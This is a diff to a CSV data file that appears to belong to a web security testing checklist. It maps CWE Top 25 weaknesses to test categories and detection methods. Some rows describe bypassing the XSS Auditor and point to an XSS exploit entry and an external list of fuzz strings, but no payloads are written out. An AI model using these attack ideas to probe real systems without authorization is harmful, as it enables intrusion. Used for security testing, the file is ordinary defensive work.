@@ -194,6 +194,276 @@ BCVRT-175,BCVRT,SSL Certificate Pinning: Defeatable (P5),BugCrowd Vuln Rating Ta
 BCVRT-176,BCVRT,Tapjacking (P5),BugCrowd Vuln Rating Taxonomy v1.3,Mobile Security Misconfiguration; Tapjacking,Tapjacking (P5),,3,,,,176,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,,
 BCVRT-177,BCVRT,Binary Planting: Privilege Escalation (P4),BugCrowd Vuln Rating Taxonomy v1.3,Client-Side Injection; Binary Planting: Privilege Escalation,Binary Planting: Privilege Escalation (P4),,3,,,,177,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-269,,,,
 BCVRT-178,BCVRT,Binary Planting: No Privilege Escalation (P5),BugCrowd Vuln Rating Taxonomy v1.3,Client-Side Injection; Binary Planting: No Privilege Escalation,Binary Planting: No Privilege Escalation (P5),,3,,,,178,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,,
+T25-01,CWE-Top-25,CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer,Input Validation,,CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer,Improper Input Validation,3,"This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results. ",7. Test for Input-Based Vulnerabilities,,1,,,,,https://cwe.mitre.org/data/definitions/119.html,119,,,TRUE,
+T25-02,CWE-Top-25,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),XSS and other Response Injection,,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),,3,,5. XSS,,2,,,,,https://cwe.mitre.org/data/definitions/79.html,79,,,TRUE,
+T25-03,CWE-Top-25,CWE-20 Improper Input Validation,Input Validation,,CWE-20 Improper Input Validation,,3," According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Web Application Scanner
+    Web Services Scanner
+    Database Scanners 
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Fuzz Tester
+    Framework-based Fuzzer
+Cost effective for partial coverage:
+    Host Application Interface Scanner
+    Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious",7. Test for Input-Based Vulnerabilities,,3,,,,,https://cwe.mitre.org/data/definitions/20.html,20,,,TRUE,
+T25-04,CWE-Top-25,CWE-200 Information Exposure,Information Leakage,,CWE-200 Information Exposure,,3,"Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Web Application Scanner
+    Web Services Scanner
+    Database Scanners
+Effectiveness: High
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Fuzz Tester
+    Framework-based Fuzzer
+    Automated Monitored Execution
+    Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
+Effectiveness: SOAR Partial",13. Follow up Any Information Leakage,,4,,,,,https://cwe.mitre.org/data/definitions/200.html,200,,,TRUE,
+T25-05,CWE-Top-25,CWE-125 Out-of-bounds Read,Input Validation,,CWE-125 Out-of-bounds Read,,3,,7. Test for Input-Based Vulnerabilities,,5,,,,,https://cwe.mitre.org/data/definitions/125.html,125,,,TRUE,
+T25-06,CWE-Top-25,CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),SQL Injection,,CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),,3,"Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Database Scanners
+Cost effective for partial coverage:
+    Web Application Scanner
+    Web Services Scanner
+Effectiveness: High
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Fuzz Tester
+    Framework-based Fuzzer
+Effectiveness: SOAR Partial",6. SQL Injection,,6,,,,,https://cwe.mitre.org/data/definitions/89.html,89,,,TRUE,
+T25-07,CWE-Top-25,CWE-416 Use After Free, ,,CWE-416 Use After Free,,3, ,12. Miscellaneous Checks,,7,,,,,https://cwe.mitre.org/data/definitions/416.html,416,,,TRUE,
+T25-08,CWE-Top-25,CWE-190 Integer Overflow or Wraparound,,,CWE-190 Integer Overflow or Wraparound,,3,"Black Box
+Sometimes, evidence of this weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
+Effectiveness: Moderate
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Fuzz Tester
+    Framework-based Fuzzer
+Effectiveness: SOAR Partial
+Note: Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring follow-up manual methods to diagnose the underlying problem.",7. Test for Input-Based Vulnerabilities,,8,,,,,https://cwe.mitre.org/data/definitions/190.html,190,,,TRUE,
+T25-09,CWE-Top-25,CWE-352 Cross-Site Request Forgery (CSRF),CSRF,,CWE-352 Cross-Site Request Forgery (CSRF),,3,"Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Web Application Scanner
+Effectiveness: High
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Fuzz Tester
+    Framework-based Fuzzer
+Effectiveness: High",8. CSRF,,9,,,,,https://cwe.mitre.org/data/definitions/352.html,352,,,TRUE,
+T25-10,CWE-Top-25,CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),Path Traversal,,CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),,3,"Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Web Application Scanner
+    Web Services Scanner
+    Database Scanners
+Effectiveness: High
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Fuzz Tester
+    Framework-based Fuzzer
+Effectiveness: High",7. Test for Input-Based Vulnerabilities,,10,,,,,https://cwe.mitre.org/data/definitions/22.html,22,,,TRUE,
+T25-11,CWE-Top-25,CWE-78 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'),OS Command Injection,,CWE-78 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'),,3,"Automated Dynamic Analysis
+This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
+Effectiveness: Moderate
+
+Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Web Application Scanner
+    Web Services Scanner
+    Database Scanners
+Effectiveness: SOAR Partial
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Fuzz Tester
+    Framework-based Fuzzer
+Effectiveness: SOAR Partial",7. Test for Input-Based Vulnerabilities,,11,,,,,https://cwe.mitre.org/data/definitions/78.html,78,,,TRUE,
+T25-12,CWE-Top-25,CWE-787 Out-of-bounds Write, ,,CWE-787 Out-of-bounds Write,,3,"Automated Dynamic Analysis
+This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results. ",11. Other,,12,,,,,https://cwe.mitre.org/data/definitions/787.html,787,,,TRUE,
+T25-13,CWE-Top-25,CWE-287 Improper Authentication,,,CWE-287 Improper Authentication,,3,"Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Web Application Scanner
+    Web Services Scanner
+    Database Scanners
+Effectiveness: SOAR Partial
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Fuzz Tester
+    Framework-based Fuzzer
+Effectiveness: SOAR Partial",4. Auth and Session,,13,,,,,https://cwe.mitre.org/data/definitions/287.html,287,,,TRUE,
+T25-14,CWE-Top-25,CWE-476 NULL Pointer Dereference, ,,CWE-476 NULL Pointer Dereference,,3,"Automated Dynamic Analysis
+This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
+Effectiveness: Moderate",11. Other,,14,,,,,https://cwe.mitre.org/data/definitions/476.html,476,,,TRUE,
+T25-15,CWE-Top-25,CWE-732 Incorrect Permission Assignment for Critical Resource, ,,CWE-732 Incorrect Permission Assignment for Critical Resource,,3,"Automated Dynamic Analysis
+Automated dynamic analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc.
+However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated dynamic analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.
+When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated dynamic analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments. 
+
+Manual Dynamic Analysis
+Manual dynamic analysis may be effective in detecting the use of custom permissions models and functions. The program could then be executed with a focus on exercising code paths that are related to the custom permissions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software.
+
+Fuzzing
+Fuzzing is not effective in detecting this weakness.
+
+Black Box
+Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
+Attach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.
+Note: Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as ""private,"" but the blog system inadvertently marks it as ""public.""
+
+Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+
+Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
+    Web Application Scanner
+    Web Services Scanner
+    Database Scanners
+Effectiveness: SOAR Partial
+
+Dynamic Analysis with Manual Results Interpretation
+
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+
+Host Application Interface Scanner
+Cost effective for partial coverage:
+
+Fuzz Tester
+    Framework-based Fuzzer
+    Automated Monitored Execution
+    Forced Path Execution
+Effectiveness: High",11. Other,,15,,,,,https://cwe.mitre.org/data/definitions/732.html,732,,,TRUE,
+T25-16,CWE-Top-25,CWE-434 Unrestricted Upload of File with Dangerous Type,,,CWE-434 Unrestricted Upload of File with Dangerous Type,,3,"Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Web Application Scanner
+    Web Services Scanner
+    Database Scanners
+Effectiveness: SOAR Partial
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Fuzz Tester
+    Framework-based Fuzzer
+Effectiveness: SOAR Partial",7. Test for Input-Based Vulnerabilities,,16,,,,,https://cwe.mitre.org/data/definitions/434.html,434,,,TRUE,
+T25-17,CWE-Top-25,CWE-611 Improper Restriction of XML External Entity Reference,XXE Injection,,CWE-611 Improper Restriction of XML External Entity Reference,,3, ,7. Test for Input-Based Vulnerabilities,,17,,,,,https://cwe.mitre.org/data/definitions/611.html,611,,,TRUE,
+T25-18,CWE-Top-25,CWE-94 Improper Control of Generation of Code ('Code Injection'),Input Validation,,CWE-94 Improper Control of Generation of Code ('Code Injection'),,3, ,7. Test for Input-Based Vulnerabilities,,18,,,,,https://cwe.mitre.org/data/definitions/94.html,94,,,TRUE,
+T25-19,CWE-Top-25,CWE-798 Use of Hard-coded Credentials,,,CWE-798 Use of Hard-coded Credentials,,3,"Black Box
+Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.
+Effectiveness: Moderate
+
+Manual Dynamic Analysis
+For hard-coded credentials in incoming authentication: use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
+Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value. 
+
+ Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Network Sniffer
+    Forced Path Execution
+Effectiveness: SOAR Partial",13. Follow up Any Information Leakage,,19,,,,,https://cwe.mitre.org/data/definitions/798.html,798,,,TRUE,
+T25-20,CWE-Top-25,CWE-400 Uncontrolled Resource Consumption,DOS,,CWE-400 Uncontrolled Resource Consumption,,3,"Automated Dynamic Analysis
+Certain automated dynamic analysis techniques may be effective in spotting resource exhaustion problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the software within a short time frame.
+Effectiveness: Moderate
+
+Fuzzing
+While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find resource exhaustion problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted software in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to handle resource exhaustion may be the cause.
+Effectiveness: Opportunistic",11. Other,,20,,,,,https://cwe.mitre.org/data/definitions/400.html,400,,,TRUE,
+T25-21,CWE-Top-25,CWE-772 Missing Release of Resource after Effective Lifetime,DOS,,CWE-772 Missing Release of Resource after Effective Lifetime,,3, ,11. Other,,21,,,,,https://cwe.mitre.org/data/definitions/772.html,772,,,TRUE,
+T25-22,CWE-Top-25,CWE-426 Untrusted Search Path,Input Validation,,CWE-426 Untrusted Search Path,,3,"Black Box
+Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
+Attach the monitor to the process and look for library functions and system calls that suggest when a search path is being used. One pattern is when the program performs multiple accesses of the same file but in different directories, with repeated failures until the proper filename is found. Library calls such as getenv() or their equivalent can be checked to see if any path-related variables are being accessed. ",7. Test for Input-Based Vulnerabilities,,22,,,,,https://cwe.mitre.org/data/definitions/426.html,426,,,TRUE,
+T25-23,CWE-Top-25,CWE-502 Deserialization of Untrusted Data,Input Validation,,CWE-502 Deserialization of Untrusted Data,,3, ,7. Test for Input-Based Vulnerabilities,,23,,,,,https://cwe.mitre.org/data/definitions/502.html,502,,,TRUE,
+T25-24,CWE-Top-25,CWE-269 Improper Privilege Management,Access Handling with Multiple Accounts,,CWE-269 Improper Privilege Management,,3, ,11. Other,,24,,,,,https://cwe.mitre.org/data/definitions/269.html,269,,,TRUE,
+T25-25,CWE-Top-25,CWE-295 Improper Certificate Validation,,,CWE-295 Improper Certificate Validation,,3,"Dynamic Analysis with Automated Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Cost effective for partial coverage:
+    Web Application Scanner
+Effectiveness: SOAR Partial
+
+Dynamic Analysis with Manual Results Interpretation
+According to SOAR, the following detection techniques may be useful:
+Highly cost effective:
+    Man-in-the-middle attack tool
+Effectiveness: High",11. Other,,25,,,,,https://cwe.mitre.org/data/definitions/295.html,295,,,TRUE,
+T25-26,CWE-Top-25,CWE-23 Relative Path Traversal,26,,CWE-23 Relative Path Traversal,,,,,,,,,,,https://cwe.mitre.org/data/definitions/23.html,23,,,TRUE,
+T25-27,CWE-Top-25,CWE-73 External Control of File Name or Path,27,,CWE-73 External Control of File Name or Path,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/73.html,73,,,TRUE,
+T25-28,CWE-Top-25,CWE-80 Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS),28,,CWE-80 Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS),,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/80.html,80,,,TRUE,
+T25-29,CWE-Top-25,CWE-81 Improper Neutralization of Script in an Error Message Web Page,29,,CWE-81 Improper Neutralization of Script in an Error Message Web Page,,,,,,,,,,,https://cwe.mitre.org/data/definitions/81.html,81,,,TRUE,
+T25-30,CWE-Top-25,CWE-83 Improper Neutralization of Script in Attributes in a Web Page,30,,CWE-83 Improper Neutralization of Script in Attributes in a Web Page,,2,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/83.html,83,,,TRUE,
+T25-31,CWE-Top-25,CWE-86 Improper Neutralization of Invalid Characters in Identifiers in Web Pages,31,,CWE-86 Improper Neutralization of Invalid Characters in Identifiers in Web Pages,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/86.html,86,,,TRUE,
+T25-32,CWE-Top-25,CWE-90 Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection'),32,,CWE-90 Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection'),,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/90.html,90,,,TRUE,
+T25-33,CWE-Top-25,CWE-91 XML Injection (aka Blind XPath Injection),33,,CWE-91 XML Injection (aka Blind XPath Injection),,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/91.html,91,,,TRUE,
+T25-34,CWE-Top-25,CWE-95 Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection'),34,,CWE-95 Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection'),,3,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/95.html,95,,,TRUE,
+T25-35,CWE-Top-25,CWE-98 Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion'),35,,CWE-98 Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion'),,3,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/98.html,98,,,TRUE,
+T25-36,CWE-Top-25,CWE-100 DEPRECATED: Technology-Specific Input Validation Problems,36,,CWE-100 DEPRECATED: Technology-Specific Input Validation Problems,,,,,,,,,,,https://cwe.mitre.org/data/definitions/100.html,100,,,TRUE,
+T25-37,CWE-Top-25,CWE-103 Struts: Incomplete validate() Method Definition,37,,CWE-103 Struts: Incomplete validate() Method Definition,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/103.html,103,,,TRUE,
+T25-38,CWE-Top-25,CWE-104 Struts: Form Bean Does Not Extend Validation Class,38,,CWE-104 Struts: Form Bean Does Not Extend Validation Class,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/104.html,104,,,TRUE,
+T25-39,CWE-Top-25,CWE-112 Missing XML Validation,39,,CWE-112 Missing XML Validation,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/112.html,112,,,TRUE,
+T25-40,CWE-Top-25,CWE-120 Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'),40,,CWE-120 Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'),,,,,,,,,,,https://cwe.mitre.org/data/definitions/120.html,120,,,TRUE,
+T25-41,CWE-Top-25,CWE-121 Stack-based Buffer Overflow,41,,CWE-121 Stack-based Buffer Overflow,,3,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/121.html,121,,,TRUE,
+T25-42,CWE-Top-25,CWE-131 Incorrect Calculation of Buffer Size,42,,CWE-131 Incorrect Calculation of Buffer Size,,,,,,,,,,,https://cwe.mitre.org/data/definitions/131.html,131,,,TRUE,
+T25-43,CWE-Top-25,CWE-135 Incorrect Calculation of Multi-Byte String Length,43,,CWE-135 Incorrect Calculation of Multi-Byte String Length,,3,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/135.html,135,,,TRUE,
+T25-44,CWE-Top-25,CWE-185 Incorrect Regular Expression,44,,CWE-185 Incorrect Regular Expression,,1,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/185.html,185,,,TRUE,
+T25-45,CWE-Top-25,CWE-201 Insertion of Sensitive Information Into Sent Data,45,,CWE-201 Insertion of Sensitive Information Into Sent Data,,1,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/201.html,201,,,TRUE,
+T25-46,CWE-Top-25,CWE-209 Generation of Error Message Containing Sensitive Information,46,,CWE-209 Generation of Error Message Containing Sensitive Information,,1,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/209.html,209,,,TRUE,
+T25-47,CWE-Top-25,CWE-215 Insertion of Sensitive Information Into Debugging Code,47,,CWE-215 Insertion of Sensitive Information Into Debugging Code,,1,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/215.html,215,,,TRUE,
+T25-48,CWE-Top-25,CWE-259 Use of Hard-coded Password,48,,CWE-259 Use of Hard-coded Password,,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/259.html,259,,,TRUE,
+T25-49,CWE-Top-25,CWE-272 Least Privilege Violation,49,,CWE-272 Least Privilege Violation,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/272.html,272,,,TRUE,
+T25-50,CWE-Top-25,CWE-274 Improper Handling of Insufficient Privileges,50,,CWE-274 Improper Handling of Insufficient Privileges,,0,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/274.html,274,,,TRUE,
+T25-51,CWE-Top-25,CWE-285 Improper Authorization,51,,CWE-285 Improper Authorization,,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/285.html,285,,,TRUE,
+T25-52,CWE-Top-25,CWE-306 Missing Authentication for Critical Function,52,,CWE-306 Missing Authentication for Critical Function,,,,,,,,,,,https://cwe.mitre.org/data/definitions/306.html,306,,,TRUE,
+T25-53,CWE-Top-25,CWE-321 Use of Hard-coded Cryptographic Key,53,,CWE-321 Use of Hard-coded Cryptographic Key,,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/321.html,321,,,TRUE,
+T25-54,CWE-Top-25,CWE-346 Origin Validation Error,54,,CWE-346 Origin Validation Error,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/346.html,346,,,TRUE,
+T25-55,CWE-Top-25,CWE-350 Reliance on Reverse DNS Resolution for a Security-Critical Action,55,,CWE-350 Reliance on Reverse DNS Resolution for a Security-Critical Action,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/350.html,350,,,TRUE,
+T25-56,CWE-Top-25,CWE-359 Exposure of Private Personal Information to an Unauthorized Actor,56,,CWE-359 Exposure of Private Personal Information to an Unauthorized Actor,,1,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/359.html,359,,,TRUE,
+T25-57,CWE-Top-25,CWE-470 Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'),57,,CWE-470 Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'),,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/470.html,470,,,TRUE,
+T25-58,CWE-Top-25,CWE-497 Exposure of Sensitive System Information to an Unauthorized Control Sphere,58,,CWE-497 Exposure of Sensitive System Information to an Unauthorized Control Sphere,,1,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/497.html,497,,,TRUE,
+T25-59,CWE-Top-25,CWE-498 Cloneable Class Containing Sensitive Information,59,,CWE-498 Cloneable Class Containing Sensitive Information,,1,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/498.html,498,,,TRUE,
+T25-60,CWE-Top-25,CWE-522 Insufficiently Protected Credentials,60,,CWE-522 Insufficiently Protected Credentials,,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/522.html,522,,,TRUE,
+T25-61,CWE-Top-25,CWE-526 Exposure of Sensitive Information Through Environmental Variables,61,,CWE-526 Exposure of Sensitive Information Through Environmental Variables,,1,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/526.html,526,,,TRUE,
+T25-62,CWE-Top-25,CWE-530 Exposure of Backup File to an Unauthorized Control Sphere,62,,CWE-530 Exposure of Backup File to an Unauthorized Control Sphere,,1,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/530.html,530,,,TRUE,
+T25-63,CWE-Top-25,CWE-538 Insertion of Sensitive Information into Externally-Accessible File or Directory,63,,CWE-538 Insertion of Sensitive Information into Externally-Accessible File or Directory,,0,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/538.html,538,,,TRUE,
+T25-64,CWE-Top-25,CWE-548 Exposure of Information Through Directory Listing,64,,CWE-548 Exposure of Information Through Directory Listing,,1,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/548.html,548,,,TRUE,
+T25-65,CWE-Top-25,CWE-564 SQL Injection: Hibernate,65,,CWE-564 SQL Injection: Hibernate,,3,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/564.html,564,,,TRUE,
+T25-66,CWE-Top-25,CWE-566 Authorization Bypass Through User-Controlled SQL Primary Key,66,,CWE-566 Authorization Bypass Through User-Controlled SQL Primary Key,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/566.html,566,,,TRUE,
+T25-67,CWE-Top-25,CWE-601 URL Redirection to Untrusted Site ('Open Redirect'),67,,CWE-601 URL Redirection to Untrusted Site ('Open Redirect'),,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/601.html,601,,,TRUE,
+T25-68,CWE-Top-25,CWE-615 Inclusion of Sensitive Information in Source Code Comments,68,,CWE-615 Inclusion of Sensitive Information in Source Code Comments,,0,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/615.html,615,,,TRUE,
+T25-69,CWE-Top-25,CWE-618 Exposed Unsafe ActiveX Method,69,,CWE-618 Exposed Unsafe ActiveX Method,,3,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/618.html,618,,,TRUE,
+T25-70,CWE-Top-25,CWE-639 Authorization Bypass Through User-Controlled Key,70,,CWE-639 Authorization Bypass Through User-Controlled Key,,3,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/639.html,639,,,TRUE,
+T25-71,CWE-Top-25,CWE-665 Improper Initialization,71,,CWE-665 Improper Initialization,,1,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/665.html,665,,,TRUE,
+T25-72,CWE-Top-25,CWE-693 Protection Mechanism Failure,72,,CWE-693 Protection Mechanism Failure,,2,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/693.html,693,,,TRUE,
+T25-73,CWE-Top-25,CWE-708 Incorrect Ownership Assignment,73,,CWE-708 Incorrect Ownership Assignment,,3,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/708.html,708,,,TRUE,
+T25-74,CWE-Top-25,CWE-830 Inclusion of Web Functionality from an Untrusted Source,74,,CWE-830 Inclusion of Web Functionality from an Untrusted Source,,1,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/830.html,830,,,TRUE,
+T25-75,CWE-Top-25,CWE-862 Missing Authorization,75,,CWE-862 Missing Authorization,,,,,,,,,,,https://cwe.mitre.org/data/definitions/862.html,862,,,TRUE,
+T25-76,CWE-Top-25,CWE-915 Improperly Controlled Modification of Dynamically-Determined Object Attributes,76,,CWE-915 Improperly Controlled Modification of Dynamically-Determined Object Attributes,,2,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/915.html,915,,,TRUE,
+T25-77,CWE-Top-25,CWE-918 Server-Side Request Forgery (SSRF),77,,CWE-918 Server-Side Request Forgery (SSRF),,2,SAST and DAST,,,,,,,,https://cwe.mitre.org/data/definitions/918.html,918,,,TRUE,
+T25-78,CWE-Top-25,CWE-942 Permissive Cross-domain Policy with Untrusted Domains,78,,CWE-942 Permissive Cross-domain Policy with Untrusted Domains,,2,DAST,,,,,,,,https://cwe.mitre.org/data/definitions/942.html,942,,,TRUE,
+T25-79,CWE-Top-25,CWE-1174 ASP.NET Misconfiguration: Improper Model Validation,79,,CWE-1174 ASP.NET Misconfiguration: Improper Model Validation,,1,SAST,,,,,,,,https://cwe.mitre.org/data/definitions/1174.html,1174,,,TRUE,
 EXT-20160108T064524,Extras,XSS Auditor Bypass,SSL Vulnerability Test,,Single Sign-On analysis,,0,"XSS detection is heuristic based. When the server transform the reflected content XSS Auditor (mostly Google Chrome) that looks for exact match can be tricked. This happens when :
 - incorrect encoding is applied
 - custom transformation are applied
@@ -298,8 +568,7 @@ EXT-20160415T002959,Extras,Attack ideas,,,Attack ideas (vulnerabilities to valid
 EXT-20160415T010824,Extras,Exploit 1,,,XSS Exploit,,3,,Extras,,,,,,,,931,,,,
 EXT-20160415T012144,Extras,XSS fuzz strings,,,,,3,"Try the list of 100 fuzz strings in the Test Ref.
 Ref.: http://slides.com/mscasharjaved/cross-site-scripting-my-love#/
-Source: http://pastebin.com/u6FY1xDA
-",Extras,,,,,,,/txt/xss100.txt,80,FALSE,TRUE,,FALSE
